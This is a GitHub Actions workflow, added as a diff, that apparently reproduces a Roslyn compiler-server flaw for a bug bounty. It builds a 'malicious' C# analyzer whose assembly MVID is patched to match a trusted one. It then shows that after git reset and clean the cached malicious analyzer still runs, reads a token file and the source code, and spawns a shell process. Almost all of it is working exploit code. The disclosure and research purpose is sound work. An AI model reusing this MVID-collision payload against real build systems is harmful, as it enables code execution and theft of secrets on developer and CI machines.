@@ -1,0 +1,218 @@
+name: roslyn-git-clean-trust-transition-lab
+
+on:
+  push:
+    branches:
+      - dotnet-bounty-lab-20260921
+    paths:
+      - .github/workflows/roslyn-git-clean-trust-transition-lab.yml
+
+permissions:
+  contents: read
+
+jobs:
+  reproduce:
+    runs-on: ubuntu-latest
+    timeout-minutes: 15
+
+    steps:
+      - uses: actions/checkout@v4
+
+      - uses: actions/setup-dotnet@v4
+        with:
+          dotnet-version: '10.0.x'
+
+      - name: Reproduce through real git reset and clean
+        shell: bash
+        run: |
+          set -euo pipefail
+          rm -rf /tmp/git-transition-repo /tmp/git-transition-fixtures
+          rm -f /tmp/GIT_TRANSITION_MARKER /tmp/GIT_TRANSITION_CHILD
+          mkdir -p /tmp/git-transition-fixtures/{trusted,malicious,reader}
+          mkdir -p /tmp/git-transition-repo
+
+          cat > /tmp/git-transition-fixtures/trusted/CollisionAnalyzer.csproj <<'EOF'
+          <Project Sdk="Microsoft.NET.Sdk">
+            <PropertyGroup>
+              <TargetFramework>net10.0</TargetFramework>
+              <AssemblyName>CollisionAnalyzer</AssemblyName>
+              <Deterministic>true</Deterministic>
+              <DebugType>none</DebugType>
+            </PropertyGroup>
+            <ItemGroup>
+              <Reference Include="Microsoft.CodeAnalysis" HintPath="$(MSBuildSDKsPath)/../Roslyn/bincore/Microsoft.CodeAnalysis.dll" Private="false" />
+            </ItemGroup>
+          </Project>
+          EOF
+          cp /tmp/git-transition-fixtures/trusted/CollisionAnalyzer.csproj /tmp/git-transition-fixtures/malicious/CollisionAnalyzer.csproj
+
+          cat > /tmp/git-transition-fixtures/trusted/CollisionAnalyzer.cs <<'EOF'
+          using System.Collections.Immutable;
+          using Microsoft.CodeAnalysis;
+          using Microsoft.CodeAnalysis.Diagnostics;
+
+          [DiagnosticAnalyzer(LanguageNames.CSharp)]
+          public sealed class CollisionAnalyzer : DiagnosticAnalyzer
+          {
+              private static readonly DiagnosticDescriptor Rule =
+                  new("LAB008", "Lab", "Trusted", "Lab", DiagnosticSeverity.Warning, true);
+              public override ImmutableArray<DiagnosticDescriptor> SupportedDiagnostics => ImmutableArray.Create(Rule);
+              public override void Initialize(AnalysisContext context)
+              {
+                  context.EnableConcurrentExecution();
+                  context.RegisterCompilationAction(static ctx =>
+                      ctx.ReportDiagnostic(Diagnostic.Create(Rule, Location.None)));
+              }
+          }
+          EOF
+
+          cat > /tmp/git-transition-fixtures/malicious/CollisionAnalyzer.cs <<'EOF'
+          using System.Collections.Immutable;
+          using System.Diagnostics;
+          using System.IO;
+          using System.Linq;
+          using Microsoft.CodeAnalysis;
+          using Microsoft.CodeAnalysis.Diagnostics;
+
+          [DiagnosticAnalyzer(LanguageNames.CSharp)]
+          public sealed class CollisionAnalyzer : DiagnosticAnalyzer
+          {
+              private static readonly DiagnosticDescriptor Rule =
+                  new("LAB008", "Lab", "Stale", "Lab", DiagnosticSeverity.Warning, true);
+              public override ImmutableArray<DiagnosticDescriptor> SupportedDiagnostics => ImmutableArray.Create(Rule);
+              public override void Initialize(AnalysisContext context)
+              {
+                  context.EnableConcurrentExecution();
+                  context.RegisterCompilationAction(static ctx =>
+                  {
+                      var tokenPath = "/tmp/git-transition-repo/.trusted/token.txt";
+                      var token = File.Exists(tokenPath) ? File.ReadAllText(tokenPath) : "<ABSENT>";
+                      var src = string.Join("\n", ctx.Compilation.SyntaxTrees.Select(t => t.GetText().ToString()));
+                      File.WriteAllText("/tmp/GIT_TRANSITION_MARKER",
+                          "ASSEMBLY=" + ctx.Compilation.AssemblyName + "\nTOKEN=" + token + "\nSOURCE=" + src);
+
+                      if (ctx.Compilation.AssemblyName == "Trusted")
+                      {
+                          Process.Start(new ProcessStartInfo
+                          {
+                              FileName = "/bin/sh",
+                              ArgumentList = { "-c", "printf 'GIT_TRANSITION_STALE_CHILD_EXECUTED\\n' > /tmp/GIT_TRANSITION_CHILD" },
+                              UseShellExecute = false
+                          })!.WaitForExit();
+                      }
+
+                      ctx.ReportDiagnostic(Diagnostic.Create(Rule, Location.None));
+                  });
+              }
+          }
+          EOF
+
+          cat > /tmp/git-transition-fixtures/reader/MvidReader.csproj <<'EOF'
+          <Project Sdk="Microsoft.NET.Sdk">
+            <PropertyGroup><TargetFramework>net10.0</TargetFramework><OutputType>Exe</OutputType></PropertyGroup>
+          </Project>
+          EOF
+          cat > /tmp/git-transition-fixtures/reader/Program.cs <<'EOF'
+          using System;
+          using System.IO;
+          using System.Reflection.Metadata;
+          using System.Reflection.PortableExecutable;
+          using var s = File.OpenRead(args[0]);
+          using var pe = new PEReader(s);
+          var md = pe.GetMetadataReader();
+          Console.WriteLine(Convert.ToHexString(md.GetGuid(md.GetModuleDefinition().Mvid).ToByteArray()));
+          EOF
+
+          dotnet build /tmp/git-transition-fixtures/trusted/CollisionAnalyzer.csproj -c Release -v:q
+          dotnet build /tmp/git-transition-fixtures/malicious/CollisionAnalyzer.csproj -c Release -v:q
+          dotnet build /tmp/git-transition-fixtures/reader/MvidReader.csproj -c Release -v:q
+
+          trusted=/tmp/git-transition-fixtures/trusted/bin/Release/net10.0/CollisionAnalyzer.dll
+          malicious=/tmp/git-transition-fixtures/malicious/bin/Release/net10.0/CollisionAnalyzer.dll
+          reader=/tmp/git-transition-fixtures/reader/bin/Release/net10.0/MvidReader.dll
+          th=$(dotnet "$reader" "$trusted")
+          mh=$(dotnet "$reader" "$malicious")
+          test "$th" != "$mh"
+
+          python3 - "$malicious" "$mh" "$th" <<'PY'
+          from pathlib import Path
+          import sys
+          p=Path(sys.argv[1]); old=bytes.fromhex(sys.argv[2]); new=bytes.fromhex(sys.argv[3])
+          b=bytearray(p.read_bytes()); assert b.count(old)==1
+          i=b.index(old); b[i:i+16]=new; p.write_bytes(b)
+          PY
+          test "$(dotnet "$reader" "$malicious")" = "$th"
+
+          cd /tmp/git-transition-repo
+          git init -q
+          git config user.email security-lab@example.invalid
+          git config user.name "Security Lab"
+
+          mkdir -p tools
+          cp "$trusted" tools/CollisionAnalyzer.dll
+          cat > App.csproj <<'EOF'
+          <Project Sdk="Microsoft.NET.Sdk">
+            <PropertyGroup>
+              <TargetFramework>net10.0</TargetFramework>
+              <OutputType>Exe</OutputType>
+              <AssemblyName>Trusted</AssemblyName>
+              <UseSharedCompilation>true</UseSharedCompilation>
+              <RunAnalyzers>true</RunAnalyzers>
+              <RunAnalyzersDuringBuild>true</RunAnalyzersDuringBuild>
+            </PropertyGroup>
+            <ItemGroup><Analyzer Include="$(MSBuildProjectDirectory)/tools/CollisionAnalyzer.dll" /></ItemGroup>
+          </Project>
+          EOF
+          echo 'System.Console.WriteLine("TRUSTED_GIT_COMMIT_SOURCE");' > Program.cs
+          git add .
+          git commit -qm "trusted baseline"
+          trusted_commit=$(git rev-parse HEAD)
+          trusted_tree=$(git rev-parse HEAD^{tree})
+
+          cp "$malicious" tools/CollisionAnalyzer.dll
+          sed -i 's/<AssemblyName>Trusted<\/AssemblyName>/<AssemblyName>Poison<\/AssemblyName>/' App.csproj
+          echo 'System.Console.WriteLine("UNTRUSTED_GIT_COMMIT_SOURCE");' > Program.cs
+          git add .
+          git commit -qm "untrusted analyzer replacement"
+          attacker_commit=$(git rev-parse HEAD)
+
+          echo "TRUSTED_COMMIT=$trusted_commit"
+          echo "ATTACKER_COMMIT=$attacker_commit"
+          echo "TRUSTED_TREE=$trusted_tree"
+          test "$trusted_commit" != "$attacker_commit"
+
+          dotnet build-server shutdown >/dev/null 2>&1 || true
+          rm -f /tmp/GIT_TRANSITION_MARKER /tmp/GIT_TRANSITION_CHILD /tmp/git-transition.log
+          export RoslynCommandLineLogFile=/tmp/git-transition.log
+
+          dotnet build App.csproj -c Release -t:Rebuild             -p:UseSharedCompilation=true             -p:RunAnalyzers=false             -p:RunAnalyzersDuringBuild=false -v:q
+          test ! -e /tmp/GIT_TRANSITION_MARKER
+          echo "UNTRUSTED_GIT_COMMIT_ANALYZER_EXECUTION=BLOCKED"
+
+          git reset --hard "$trusted_commit"
+          git clean -ffdx
+          test "$(git rev-parse HEAD)" = "$trusted_commit"
+          test "$(git status --porcelain)" = ""
+          test "$(git rev-parse HEAD^{tree})" = "$trusted_tree"
+          cmp "$trusted" tools/CollisionAnalyzer.dll
+          echo "WORKSPACE_RESTORED_BY_GIT_RESET_AND_CLEAN=CONFIRMED"
+          echo "TRUSTED_GIT_TREE_EXACTLY_RESTORED=CONFIRMED"
+          echo "TRUSTED_ANALYZER_ON_DISK=PRISTINE"
+
+          mkdir -p .trusted
+          printf 'TRUSTED_TOKEN_CREATED_AFTER_GIT_CLEAN_20260921' > .trusted/token.txt
+
+          dotnet build App.csproj -c Release -t:Rebuild -p:UseSharedCompilation=true -v:q
+
+          test -e /tmp/GIT_TRANSITION_MARKER
+          test -e /tmp/GIT_TRANSITION_CHILD
+          grep -q 'ASSEMBLY=Trusted' /tmp/GIT_TRANSITION_MARKER
+          grep -q 'TRUSTED_TOKEN_CREATED_AFTER_GIT_CLEAN_20260921' /tmp/GIT_TRANSITION_MARKER
+          grep -q 'TRUSTED_GIT_COMMIT_SOURCE' /tmp/GIT_TRANSITION_MARKER
+
+          echo "GIT_RESET_CLEAN_MVID_BYPASS=CONFIRMED"
+          echo "POST_CLEAN_TRUSTED_TOKEN_READ=CONFIRMED"
+          echo "POST_CLEAN_TRUSTED_SOURCE_READ=CONFIRMED"
+          echo "POST_CLEAN_TRUSTED_CHILD_PROCESS_EXECUTION=CONFIRMED"
+          echo "SAME_SERVER_EVIDENCE:"
+          grep -E 'ID=VBCSCompiler .*Begin Analyzer Consistency' /tmp/git-transition.log || true
